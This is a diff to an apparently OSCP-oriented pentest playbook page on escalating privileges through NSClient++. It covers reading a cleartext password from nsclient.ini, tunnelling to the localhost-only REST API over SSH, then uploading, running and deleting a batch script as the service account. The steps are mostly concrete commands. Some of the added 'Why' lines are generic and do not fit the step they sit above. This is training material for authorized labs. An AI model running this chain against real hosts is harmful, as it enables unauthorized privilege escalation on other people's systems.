@@ -6,6 +6,7 @@
 
 ## Run this
 
+> **Why:** This command gathers the windows web nsclient++ evidence needed to decide which documented route applies next.
 ~~~cmd
 type "C:\Program Files\NSClient++\nsclient.ini"
 ~~~
@@ -23,11 +24,12 @@ check = scripts\\check.bat
 
 ## What did you get?
 
-- **Cleartext password and external scripts enabled:** save the password privately and prepare an SSH tunnel.
-- **Only localhost is allowed:** do not attack the API directly from Kali.
+- **Cleartext password and external scripts enabled:** run `boxset Password $Password`, then prepare the SSH tunnel in the next section.
+- **Only localhost is allowed:** run `ssh -L $LocalPort:127.0.0.1:$RemotePort $Username@$BoxIP` and use the forwarded local port for every API request.
 
 ## Run this
 
+> **Why:** This SSH connection tests the recovered credential or reaches a legacy daemon using the compatibility options it requires.
 ~~~bash
 ssh -L $TunnelPort:127.0.0.1:$NSCPPort $Username@$BoxIP -N
 curl -sk https://127.0.0.1:$TunnelPort/ -o /dev/null -w "%{http_code}\n"
@@ -42,13 +44,14 @@ curl -sk https://127.0.0.1:$TunnelPort/ -o /dev/null -w "%{http_code}\n"
 ## What did you get?
 
 - **302 redirect to /index.html:** the tunnel reaches NSClient++.
-- **Connection failure:** keep SSH open, recheck the local port, and verify the SSH credential.
+- **Connection failure:** run `ss -ltnp | grep $LocalPort`, keep SSH open, and rerun `ssh -L $LocalPort:127.0.0.1:$RemotePort $Username@$BoxIP`.
 
 > [!warning] 💡
 > -N suppresses the remote shell but does not skip SSH authentication. The tunnel still prompts for the SSH password.
 
 ## Run this
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ~~~bash
 curl -sk -u $AdminUser:$NSCPPassword \
   https://127.0.0.1:$TunnelPort/api/v1/queries \
@@ -64,10 +67,11 @@ curl -sk -u $AdminUser:$NSCPPassword \
 ## What did you get?
 
 - **200:** Basic Authentication succeeded. Upload an external script.
-- **401 or 403:** recheck the password and API username.
+- **401 or 403:** rerun the request with `$Username` and `$Password`, then record whether the API account is authorized.
 
 ## Run this
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ~~~bash
 cat > /tmp/check.bat <<'EOF'
 @echo off
@@ -91,12 +95,13 @@ Added check as scripts\\check.bat
 
 ## What did you get?
 
-- **result: 0:** the registered script executed. Read the proof file to confirm the service identity.
-- **No output available:** this can be normal for a batch script. Check the file it wrote.
+- **result: 0:** run `type C:\Windows\Temp\proof.txt` to confirm the service identity.
+- **No output available:** run `type C:\Windows\Temp\proof.txt` to check the file written by the batch script.
 - **404 or 403:** confirm the script name, route, and API privileges.
 
 ## Run this
 
+> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
 ~~~bash
 curl -sk -u $AdminUser:$NSCPPassword \
   -X DELETE \
@@ -116,7 +121,7 @@ verify_status=4xx
 ## What did you get?
 
 - **Execution fails after deletion:** the temporary script is gone.
-- **Execution still succeeds:** remove the script definition and file separately, then retry the verification.
+- **Execution still succeeds:** delete the script definition through the API, delete the file with `del C:\Windows\Temp\$ScriptName`, then rerun the verification request.
 
 ## Gotcha
 
@@ -127,4 +132,14 @@ Delete any proof files while SSH access still works. Remove target files first, 
 - [NSClient++ REST API](https://nsclient.org/docs/api/rest/)
 - [NSClient++ scripts API](https://nsclient.org/docs/api/rest/scripts/)
 - [HackTricks NSClient++ privilege escalation](https://book.hacktricks.xyz/windows-hardening/privilege-escalation#nsclient)
+## Seen in
+- *(no write-up yet)*
 
+## Related stages
+
+- [[Windows - Service Scan]]
+- [[Windows - Web Enum]]
+- [[Windows - SMB Enum]]
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
